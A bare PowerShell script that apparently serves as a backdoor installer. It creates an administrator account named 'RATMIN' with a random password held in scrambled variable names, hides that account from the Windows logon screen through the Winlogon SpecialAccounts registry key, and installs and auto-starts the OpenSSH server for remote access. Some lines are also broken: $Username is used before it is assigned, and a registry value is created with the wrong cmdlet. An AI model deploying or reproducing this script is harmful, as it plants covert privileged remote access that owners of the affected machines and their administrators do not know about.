# Generate a random password
function RandomPasswordGenerator {
    return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
}

# Remove the local user if it exists
if (Get-LocalUser -Name $Username -ErrorAction SilentlyContinue) {
    Remove-LocalUser -Name $Username
}

function CreateAdministrator {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password1
    )    
    begin {
    }    
    process {
        New-LocalUser "$Username" -Password $Password1 -FullName "$Username" -Description "Temporary local admin"
        Write-Verbose "$Username local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$Username"
        Write-Verbose "$Username added to the local administrator group"
    }    
    end {
    }
}

# make admin
$Username = "RATMIN"
$DCilJFugpP = RandomPasswordGenerator
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
CreateAdministrator -Username $Username -Password1 $HcMjDkGFes


# Hide the user from the Windows logon screen
New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start the sshd service
Start-Service sshd

# Set the sshd service to start automatically
Set-Service -Name sshd -StartupType "Automatic"
